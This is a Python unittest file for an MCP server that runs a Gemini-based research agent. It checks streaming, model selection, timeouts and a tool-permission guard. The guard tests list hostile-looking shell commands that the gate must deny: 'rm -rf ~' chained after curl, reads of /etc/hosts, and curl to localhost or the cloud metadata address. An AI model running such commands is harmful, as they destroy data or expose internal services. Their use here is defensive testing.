from __future__ import annotations

import asyncio
import importlib.util
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tempfile
import textwrap
import unittest
from unittest.mock import AsyncMock, patch


SERVER_PATH = Path(__file__).parents[1] / "antigravity_mcp_server.py"
SPEC = importlib.util.spec_from_file_location("antigravity_mcp_server_under_test", SERVER_PATH)
if SPEC is None or SPEC.loader is None:
    raise RuntimeError(f"Unable to load {SERVER_PATH}")
server = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = server
SPEC.loader.exec_module(server)


class AntigravityMcpServerTest(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.fake_agy = Path(self.temp_dir.name) / "agy"
        self.fake_agy.write_text(
            textwrap.dedent(
                """\
                #!/usr/bin/env python3
                import json
                import sys
                import time

                args = sys.argv[1:]
                prompt = json.loads(sys.stdin.readline())["message"]["content"]
                conversation = "11111111-1111-4111-8111-111111111111"
                print(json.dumps({"event": "init", "conversation_id": conversation}), flush=True)
                print(json.dumps({"event": "step_update", "step_update": {
                    "conversation_id": conversation,
                    "step_index": 0,
                    "state": "DONE",
                    "step_type": "user_input",
                }}), flush=True)
                if "TRIGGER_RESULT_BEFORE_TIMEOUT" in prompt:
                    print(json.dumps({"event": "result", "result": {
                        "status": "SUCCESS", "conversation_id": conversation,
                        "structured_output": {"status": "success", "content": "saved report", "error": None},
                    }}), flush=True)
                    time.sleep(10)
                if "TRIGGER_METADATA_ONLY" in prompt:
                    print(json.dumps({"event": "step_update", "step_update": {
                        "conversation_id": conversation, "step_index": 1, "state": "DONE",
                        "step_type": "agent_response", "duration_seconds": 1.0,
                    }}), flush=True)
                    print("[agy] print timeout after 8m38s with turn in progress; returning partial output", file=sys.stderr)
                    raise SystemExit(1)
                if "TRIGGER_SLOW" in prompt:
                    time.sleep(10)
                if "TRIGGER_DELAY" in prompt:
                    time.sleep(2)
                if "TRIGGER_SEARCH_ERROR" in prompt:
                    print(json.dumps({"event": "step_update", "step_update": {
                        "conversation_id": conversation,
                        "step_index": 1,
                        "state": "ERROR",
                        "step_type": "tool",
                        "tool_name": "search_web",
                    }}), flush=True)
                    time.sleep(0.1)
                tool_name = "search_web" if "TRIGGER_SEARCH_SUCCESS" in prompt else "run_command"
                print(json.dumps({"event": "step_update", "step_update": {
                    "conversation_id": conversation,
                    "step_index": 1,
                    "state": "ACTIVE",
                    "step_type": "tool",
                    "tool_name": tool_name,
                }}), flush=True)
                print(json.dumps({"event": "step_update", "step_update": {
                    "conversation_id": conversation,
                    "step_index": 1,
                    "state": "DONE",
                    "step_type": "tool",
                    "tool_name": tool_name,
                    "tool_info": {"output": "ok"},
                }}), flush=True)
                response = "done"
                structured_output = None
                if "--json-schema" in args:
                    status = "error" if "TRIGGER_FETCH_ERROR" in prompt else "success"
                    structured_output = {
                        "status": status,
                        "content": "" if status == "error" else ("x" * 200000 if "TRIGGER_LARGE" in prompt else "done"),
                        "error": "HTTP 403 Forbidden" if status == "error" else None,
                    }
                    response = "not-json" if "TRIGGER_STRUCTURED_ONLY" in prompt else json.dumps(structured_output)
                result = {
                    "status": "SUCCESS",
                    "conversation_id": conversation,
                    "response": response,
                    "usage": {"total_tokens": 3},
                }
                if structured_output is not None:
                    result["structured_output"] = structured_output
                if "TRIGGER_PARTIAL" in prompt:
                    result["status"] = "ERROR"
                    result["response"] = "half report"
                    result.pop("structured_output", None)
                    print("[agy] print timeout after 4m29s with turn in progress; returning partial output", file=sys.stderr)
                print(json.dumps({"event": "result", "result": result}), flush=True)
                """
            ),
            encoding="utf-8",
        )
        self.fake_agy.chmod(self.fake_agy.stat().st_mode | stat.S_IXUSR)
        self.agy_patch = patch.object(server, "get_agy_path", return_value=str(self.fake_agy))
        self.agy_patch.start()

    async def asyncTearDown(self) -> None:
        self.agy_patch.stop()
        self.temp_dir.cleanup()

    def test_stream_command_reads_the_prompt_from_stdin(self) -> None:
        command = server.build_agy_stream_command(
            model="gemini-3.8-flash-low",
            effort="low",
            timeout=60,
            extra_flags=["--add-dir", "/tmp/project"],
        )

        self.assertEqual(command[command.index("--input-format") + 1], "stream-json")
        self.assertEqual(command[command.index("--print-timeout") + 1], "58s")
        self.assertEqual(command[command.index("--add-dir") + 1], "/tmp/project")

    def test_resolve_model_builds_flash_id_and_rejects_others(self) -> None:
        self.assertEqual(server.resolve_model("gemini-3.8-flash", "medium"), "gemini-3.8-flash-medium")
        self.assertEqual(server.resolve_model("gemini-4.0-flash", "high"), "gemini-4.0-flash-high")
        for model, effort, error in (
            ("gemini-3.8-flash-low", "low", "without a level"),
            ("gemini-pro", "medium", "version 3.8 or later"),
            ("gemini-3.7-flash", "medium", "version 3.8 or later"),
            ("gemini-3.8-flash", "max", "effort must be"),
        ):
            with self.assertRaisesRegex(ValueError, error):
                server.resolve_model(model, effort)

    async def test_stream_turn_sends_prompt_through_stdin_and_reads_result(self) -> None:
        original = asyncio.create_subprocess_exec
        launched = []

        async def record(*args, **kwargs):
            launched.append(args)
            for name in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"):
                self.assertEqual(kwargs["env"][name], proxy)
                self.assertEqual(kwargs["env"][name.lower()], proxy)
            self.assertEqual(os.environ["https_proxy"], "http://parent.invalid")
            return await original(*args, **kwargs)

        proxy = "socks5://127.0.0.1:1088"
        with patch.dict(os.environ, {"AGY_PROXY_URL": proxy, "https_proxy": "http://parent.invalid"}), \
                patch.object(server.asyncio, "create_subprocess_exec", side_effect=record):
            result = await server.run_agy_stream_turn(
                message="private prompt",
                cwd=self.temp_dir.name,
                model="gemini-3.8-flash-low",
                effort="low",
                timeout=5,
                extra_flags=None,
            )

        self.assertEqual(result["status"], "COMPLETED")
        self.assertEqual(result["response"], "done")
        self.assertEqual(result["usage"], {"total_tokens": 3})
        self.assertEqual(result["conversation_id"], "11111111-1111-4111-8111-111111111111")
        self.assertFalse(any("private prompt" in str(argument) for argument in launched[0]))

    async def test_grounded_search_accepts_agent_answer_after_alternate_retrieval(self) -> None:
        result = await server.antigravity_grounded_search("TRIGGER_SEARCH_SUCCESS")

        self.assertEqual(result, "done")

        recovered = await server.antigravity_grounded_search("ALTERNATE_RETRIEVAL")
        self.assertEqual(recovered, "done")

    async def test_grounded_search_allows_agent_recovery_after_search_web_error(self) -> None:
        result = await asyncio.wait_for(
            server.antigravity_grounded_search("TRIGGER_SEARCH_ERROR"),
            timeout=2,
        )

        self.assertEqual(result, "done")

    async def test_fetch_url_rejects_http_error_and_accepts_structured_output(self) -> None:
        failed = await server.antigravity_fetch_url(
            "https://example.invalid",
            prompt="TRIGGER_FETCH_ERROR",
        )
        self.assertIn("FALLBACK_REQUIRED", failed)
        self.assertIn("HTTP 403 Forbidden", failed)

        succeeded = await server.antigravity_fetch_url(
            "https://example.com",
            prompt="TRIGGER_STRUCTURED_ONLY",
            effort="high",
        )
        self.assertEqual(succeeded, "done")

    async def test_large_structured_result_survives_stream_transport(self) -> None:
        result = await server.antigravity_fetch_url("https://example.com", "TRIGGER_LARGE")
        self.assertEqual(result, "x" * 200000)

    async def test_research_failure_returns_partial_text_or_fallback(self) -> None:
        streamed = await server.antigravity_codebase_scout("TRIGGER_PARTIAL", target_path=self.temp_dir.name)
        self.assertTrue(streamed.startswith("PARTIAL ("))
        self.assertIn("half report", streamed)
        failed = {"status": "TIMED_OUT", "error": "print timeout", "partial_response": "half report",
                  "conversation_id": None, "response": "print timeout", "structured_output": None}
        with patch.object(server, "run_agy_stream_turn", new_callable=AsyncMock, return_value=failed):
            result = await server.antigravity_grounded_search("query")
            self.assertTrue(result.startswith("PARTIAL (print timeout):"))
            self.assertIn("half report", result)
            failed["partial_response"] = ""
            result = await server.antigravity_grounded_search("query")
            self.assertTrue(result.startswith("FALLBACK_REQUIRED"))

    async def test_scout_uses_flash_family_with_selected_effort(self) -> None:
        result = {"status": "COMPLETED", "response": "", "structured_output": {
            "status": "success", "content": "report", "error": None,
        }, "conversation_id": None}
        with patch.object(server, "run_agy_stream_turn", new_callable=AsyncMock, return_value=result) as run:
            for effort, budget, words in (("low", 90, 500), ("medium", 180, 800), ("high", 300, None)):
                report = await server.antigravity_codebase_scout("q", target_path=self.temp_dir.name, effort=effort)
                self.assertEqual(report, "report")
                self.assertEqual(run.call_args.kwargs["model"], f"gemini-3.8-flash-{effort}")
                self.assertEqual(run.call_args.kwargs["effort"], effort)
                message = run.call_args.kwargs["message"]
                self.assertIn(f"Reasoning Effort and Investigation Depth: {effort}", message)
                depth = {"low": "entry points and exports", "medium": "critical implementations and contracts",
                         "high": "including dependencies, errors and test source"}[effort]
                self.assertIn(depth, message)
                self.assertIn(f"about {budget} seconds", message)
                if words:
                    self.assertIn(f"keep it under {words} words", message)
                else:
                    self.assertNotIn("keep it under", message)
            await server.antigravity_codebase_scout("q", target_path=self.temp_dir.name)
            self.assertEqual(run.call_args.kwargs["model"], "gemini-3.8-flash-medium")
            self.assertEqual(run.call_args.kwargs["timeout"], server.RESEARCH_SAFETY_LIMIT_SECONDS)
            message = run.call_args.kwargs["message"]
            self.assertIn("about 180 seconds", message)
            self.assertIn("After about two thirds of the budget", message)
            self.assertNotIn("exhaustive", message)
            self.assertIn("Never execute shell or terminal commands", message)
            self.assertIn("## Needs Verification", message)
            self.assertIn("small scoped calls", server.antigravity_codebase_scout.__doc__)
            flags = run.call_args.kwargs["extra_flags"]
            self.assertNotIn("--mode", flags)
            self.assertEqual(run.call_args.kwargs["cwd"], str(SERVER_PATH.parent / "workspaces" / "local"))
            self.assertEqual(flags[flags.index("--add-dir") + 1], self.temp_dir.name)
            run.reset_mock()
            invalid = await server.antigravity_codebase_scout("q", target_path=self.temp_dir.name, effort="thorough")
            self.assertIn("effort must be", invalid)
            invalid = await server.antigravity_codebase_scout("q", target_path=self.temp_dir.name, model="gemini-3.8-flash-low")
            self.assertIn("without a level", invalid)
            run.assert_not_called()

    async def test_docs_research_reuses_scout_gate_with_docs_prompt(self) -> None:
        result = {"status": "COMPLETED", "response": "", "structured_output": {
            "status": "success", "content": "report", "error": None,
        }, "conversation_id": None}
        with patch.object(server, "run_agy_stream_turn", new_callable=AsyncMock, return_value=result) as run:
            for scope in ("current", "history", "all"):
                report = await server.antigravity_docs_research("q", target_path=self.temp_dir.name, scope=scope, effort="high")
                self.assertEqual(report, "report")
                self.assertEqual(run.call_args.kwargs["model"], "gemini-3.8-flash-high")
                self.assertIn(f"Document Scope: {scope}. {server.DOCS_RESEARCH_SCOPES[scope]}", run.call_args.kwargs["message"])
                self.assertIn("about 300 seconds", run.call_args.kwargs["message"])
            await server.antigravity_docs_research("q", target_path=self.temp_dir.name)
            self.assertEqual(run.call_args.kwargs["model"], "gemini-3.8-flash-medium")
            message = run.call_args.kwargs["message"]
            self.assertIn("Document Scope: current.", message)
            self.assertIn("about 180 seconds", message)
            self.assertIn("keep it under 800 words", message)
            self.assertIn("Never execute shell or terminal commands", message)
            for section in ("## Documents", "## Answer", "## Conflicts", "## Gaps"):
                self.assertIn(section, message)
            self.assertNotIn("Needs Verification", message)
            flags = run.call_args.kwargs["extra_flags"]
            self.assertNotIn("--mode", flags)
            self.assertEqual(run.call_args.kwargs["cwd"], str(SERVER_PATH.parent / "workspaces" / "local"))
            self.assertEqual(flags[flags.index("--add-dir") + 1], self.temp_dir.name)
            run.reset_mock()
            for kwargs, error in (({"scope": "recent"}, "scope must be"), ({"effort": "thorough"}, "effort must be"),
                                  ({"model": "gemini-pro"}, "version 3.8 or later")):
                self.assertIn(error, await server.antigravity_docs_research("q", target_path=self.temp_dir.name, **kwargs))
            run.assert_not_called()

    def test_document_map_lists_current_documents_only(self) -> None:
        root = Path(self.temp_dir.name) / "repo"
        files = {
            "README.md": "", "docs/guide.md": "", "pkg/package.json": '{"version": "1.0.0"}',
            "pkg/docs/1.0.0/snapshots/spec.md": "", "pkg/docs/1.0.0/changelog.md": "", "pkg/docs/1.0.0/plan.md": "",
            "pkg/docs/2.0.0/snapshots/spec.md": "", "lib/docs/0.1.0/notes.md": "", "lib/docs/0.2.0/notes.md": "",
            "notes/sessions/log.md": "", "node_modules/dep/README.md": "", ".hidden/secret.md": "",
        }
        for path, content in files.items():
            (root / path).parent.mkdir(parents=True, exist_ok=True)
            (root / path).write_text(content)
        document_map = server.build_document_map(str(root))
        self.assertEqual(document_map.splitlines(), [
            "./: README.md",
            "docs/: guide.md",
            "lib/docs/0.2.0/: notes.md",
            "notes/sessions/: log.md",
            "pkg/docs/1.0.0/: changelog.md",
            "pkg/docs/1.0.0/snapshots/: spec.md",
        ])
        prompt = server.build_docs_research_prompt("q", document_map=document_map)
        self.assertIn("1. Start from the document map", prompt)
        self.assertIn("7. Stop once", prompt)
        self.assertTrue(prompt.endswith(document_map))
        self.assertNotIn("Document Map", server.build_docs_research_prompt("q"))

    def test_document_map_keeps_project_folders_with_a_dot_in_git(self) -> None:
        root = Path(self.temp_dir.name) / "git-repo"
        for path in ("README.md", ".agent-style/RULES.md", ".codex/skills/house/SKILL.md", ".agents/skills/vendor/SKILL.md"):
            (root / path).parent.mkdir(parents=True, exist_ok=True)
            (root / path).write_text("")
        subprocess.run(["git", "init", "-q", str(root)], check=True)
        self.assertEqual(server.build_document_map(str(root)).splitlines(), [
            ".agent-style/: RULES.md",
            ".codex/skills/house/: SKILL.md",
            "./: README.md",
        ])

    async def test_metadata_without_final_result_is_not_a_partial_report(self) -> None:
        result = await server.antigravity_codebase_scout("TRIGGER_METADATA_ONLY", target_path=self.temp_dir.name)
        self.assertTrue(result.startswith("FALLBACK_REQUIRED"))
        self.assertIn("No answer text was available", result)
        self.assertIn("11111111-1111-4111-8111-111111111111", result)

    def load_guard(self):
        guard_spec = importlib.util.spec_from_file_location("tool_guard", SERVER_PATH.parent / "tool_guard.py")
        guard = importlib.util.module_from_spec(guard_spec)
        guard_spec.loader.exec_module(guard)
        return guard

    def test_local_gate_denies_execution_changes_and_mcp_tools_that_do_not_read(self) -> None:
        guard = self.load_guard()

        def decision(step: str, mcp_tool: str | None = None) -> str:
            # The payload shape agy 1.4.7 sends to PreToolUse hooks.
            args = {"ServerName": "server", "ToolName": mcp_tool, "Arguments": {}} if mcp_tool else {"Path": "/tmp/x"}
            return guard.decide({"toolCall": {"name": step, "args": args}}, "local")["decision"]

        for step in ("run_command", "write_file", "edit_file", "replace_file_content", "multi_replace_file_content",
                     "invoke_subagent", "define_subagent", "manage_subagents", "schedule", "manage_task", "send_message",
                     "call_mcp_tool", "mcp_serena_execute_shell_command", "runCommand"):
            self.assertEqual(decision(step), "deny", step)
        for tool in ("write_memory", "execute_shell_command", "ratdesk_set_task_status", "ratdesk_add_task_comment",
                     "ratdesk_upload_task_attachment", "ratdesk_download_task_attachment", "activate_project", "open_dashboard"):
            self.assertEqual(decision("call_mcp_tool", tool), "deny", tool)
        for step in ("read_file", "list_dir", "grep_search", "find_by_name", "search_web", "read_url_content",
                     "read_resource", "finish", "mcp_codegraph_codegraph_explore"):
            self.assertEqual(decision(step), "allow", step)
        for tool in ("codegraph_explore", "query-docs", "resolve-library-id", "find_symbol", "get_symbols_overview",
                     "search_openai_docs", "ratdesk_get_task"):
            self.assertEqual(decision("call_mcp_tool", tool), "allow", tool)

    def test_web_gate_allows_only_search_and_curl_page_reads(self) -> None:
        guard = self.load_guard()

        def decision(step: str, command: str = "") -> str:
            return guard.decide({"toolCall": {"name": step, "args": {"CommandLine": command}}}, "web")["decision"]

        for command in ('curl -sSL "https://docs.python.org/3/" | grep -C 5 "wait_for" | head -n 40',
                        "curl -s 'https://api.github.com/repos/a/b/releases?per_page=5&page=1' | head -c 3000",
                        "curl -A 'Mozilla/5.0 (Macintosh)' -sL https://pypi.org/pypi/mcp/json | sed -n '1,40p'",
                        "curl -sL https://chromestatus.com/roadmap | wc -l", "curl -s https://xn--e1afmkfd.xn--p1ai/"):
            self.assertEqual(decision("run_command", command), "allow", command)
        for command in ("curl -sL https://pypi.org/pypi/mcp/json | python3 -c 'print(1)'", "curl -s https://a.dev; rm -rf ~",
                        "curl -s https://a.dev > out.txt", "curl -s https://a.dev/$HOME", "curl -o /tmp/x https://a.dev",
                        "curl -H @/etc/hosts https://a.dev", "curl -s file:///etc/hosts", "curl -s http://localhost:8123/",
                        "curl -s http://169.254.169.254/", "curl -s http://2130706433/", "curl -X POST https://a.dev",
                        "curl -s https://a.dev | grep x /etc/hosts", "curl -s https://a.dev | sed -n '1w /tmp/x'",
                        "curl -s https://a.dev | wc -l /etc/hosts", "cat /etc/hosts", "wget -qO- https://a.dev"):
            self.assertEqual(decision("run_command", command), "deny", command)
        for step, expected in (("search_web", "allow"), ("finish", "allow"), ("manage_task", "allow"), ("read_file", "deny"),
                               ("call_mcp_tool", "deny"), ("write_file", "deny"), ("schedule", "deny")):
            self.assertEqual(decision(step), expected, step)

    def test_each_workspace_hook_runs_the_gate_with_its_profile(self) -> None:
        for profile in ("local", "web"):
            hooks = json.loads((SERVER_PATH.parent / "workspaces" / profile / ".agents" / "hooks.json").read_text())
            command = next(iter(hooks.values()))["PreToolUse"][0]["hooks"][0]["command"]
            for step, expected in (("read_file", "allow" if profile == "local" else "deny"), ("write_file", "deny")):
                result = subprocess.run(command, shell=True, cwd=self.temp_dir.name,
                                        env=server.agy_environment(), check=True, capture_output=True, text=True,
                                        input=json.dumps({"toolCall": {"name": step, "args": {}}}))
                self.assertEqual(json.loads(result.stdout)["decision"], expected)

    def test_proxy_file_and_no_override(self) -> None:
        path = Path(self.temp_dir.name) / "proxy-url"
        with patch.dict(os.environ, {"HTTPS_PROXY": "http://inherited"}, clear=True):
            self.assertEqual(server.agy_environment()["HTTPS_PROXY"], "http://inherited")
            os.environ["AGY_PROXY_FILE"] = str(path)
            with self.assertRaises(FileNotFoundError):
                server.agy_environment()
            path.write_text("https://alice:test@proxy.example:443\n")
            self.assertEqual(server.agy_environment()["https_proxy"], path.read_text().strip())

    async def test_tool_schemas_list_allowed_values(self) -> None:
        tools = await server.mcp.list_tools()
        self.assertTrue(all(tool.annotations.read_only_hint for tool in tools))
        schemas = {tool.name: tool.input_schema["properties"] for tool in tools}
        self.assertEqual(len(schemas), 4)
        for properties in schemas.values():
            self.assertEqual(properties["effort"]["enum"], ["low", "medium", "high"])
            self.assertEqual(properties["effort"]["default"], "medium")
            self.assertEqual(properties["model"]["default"], "gemini-3.8-flash")
        self.assertEqual(schemas["antigravity_docs_research"]["scope"]["enum"], ["current", "history", "all"])
        self.assertEqual(schemas["antigravity_grounded_search"]["output_format"]["enum"], ["markdown", "json"])

    async def test_timeout_is_a_recommendation_and_does_not_cut_off_the_answer(self) -> None:
        result = await server.antigravity_fetch_url("https://example.com", "TRIGGER_DELAY", timeout=1)
        self.assertEqual(result, "done")

    async def test_report_survives_safety_limit_before_process_exit(self) -> None:
        with patch.object(server, "RESEARCH_SAFETY_LIMIT_SECONDS", 1):
            result = await server.antigravity_codebase_scout("TRIGGER_RESULT_BEFORE_TIMEOUT", target_path=self.temp_dir.name)
        self.assertTrue(result.startswith("PARTIAL (safety limit 1s reached):"))
        self.assertIn("saved report", result)

    async def test_structured_error_preserves_available_content(self) -> None:
        result = {"status": "COMPLETED", "response": "", "structured_output": {
            "status": "error", "content": "verified files; one contract is unresolved", "error": "incomplete",
        }, "partial_response": "verified files; one contract is unresolved", "conversation_id": None}
        with patch.object(server, "run_agy_stream_turn", new_callable=AsyncMock, return_value=result):
            report = await server.antigravity_codebase_scout("q", target_path=self.temp_dir.name)
        self.assertTrue(report.startswith("PARTIAL (incomplete):"))
        self.assertIn("verified files", report)

    async def test_research_cancellation_propagates_and_reaps_process(self) -> None:
        processes = []
        original = asyncio.create_subprocess_exec
        started = asyncio.Event()

        async def record(*args, **kwargs):
            process = await original(*args, **kwargs)
            processes.append(process)
            if "--model" in args:
                started.set()
            return process

        with patch.object(server.asyncio, "create_subprocess_exec", side_effect=record):
            task = asyncio.create_task(server.antigravity_fetch_url("https://example.com", "TRIGGER_SLOW"))
            await asyncio.wait_for(started.wait(), 2)
            task.cancel()
            with self.assertRaises(asyncio.CancelledError):
                await task
        self.assertTrue(all(process.returncode is not None for process in processes))

    def test_invalid_agent_results_cannot_be_reported_as_success(self) -> None:
        for response in ("not-json", "[]", {}, {"status": "success", "content": ""},
                         {"status": "success", "content": "plausible", "error": "Missing article"}):
            content, error = server.parse_research_result(response)
            self.assertIsNone(content)
            self.assertTrue(error)

    async def test_web_tools_follow_effort_and_invalid_values_do_not_launch(self) -> None:
        result = {"status": "COMPLETED", "response": "", "structured_output": {
            "status": "success", "content": "done", "error": None,
        }, "conversation_id": "11111111-1111-4111-8111-111111111111"}
        calls = [
            (server.antigravity_fetch_url, {"url": "https://example.com"}),
            (server.antigravity_grounded_search, {"query": "query"}),
        ]
        with patch.object(server, "run_agy_stream_turn", new_callable=AsyncMock, return_value=result) as run:
            for function, args in calls:
                await function(**args)
                self.assertEqual(run.call_args.kwargs["model"], "gemini-3.8-flash-medium")
                self.assertEqual(run.call_args.kwargs["effort"], "medium")
                self.assertEqual(run.call_args.kwargs["timeout"], server.RESEARCH_SAFETY_LIMIT_SECONDS)
                self.assertIn("about 280 seconds", run.call_args.kwargs["message"])
                self.assertEqual(run.call_args.kwargs["cwd"], str(SERVER_PATH.parent / "workspaces" / "web"))
                self.assertEqual(run.call_args.kwargs["extra_flags"], ["--disable-slash-commands"])
                await function(**args, effort="high")
                self.assertEqual(run.call_args.kwargs["model"], "gemini-3.8-flash-high")
                self.assertIn("about 480 seconds", run.call_args.kwargs["message"])
                await function(**args, effort="low", timeout=450)
                self.assertEqual(run.call_args.kwargs["model"], "gemini-3.8-flash-low")
                self.assertIn("about 450 seconds", run.call_args.kwargs["message"])
            run.reset_mock()
            for kwargs in ({"timeout": 0}, {"timeout": -1}, {"timeout": 901}, {"timeout": True}, {"timeout": 1.5},
                           {"model": "gemini-3.8-flash-low"}, {"model": "gemini-pro"}, {"effort": "max"}):
                result = await server.antigravity_fetch_url("https://example.com", **kwargs)
                self.assertTrue(result.startswith("Error: "), (kwargs, result))
            self.assertIn("between 1 and 900", await server.antigravity_grounded_search("q", timeout=901))
            run.assert_not_called()


if __name__ == "__main__":
    unittest.main()
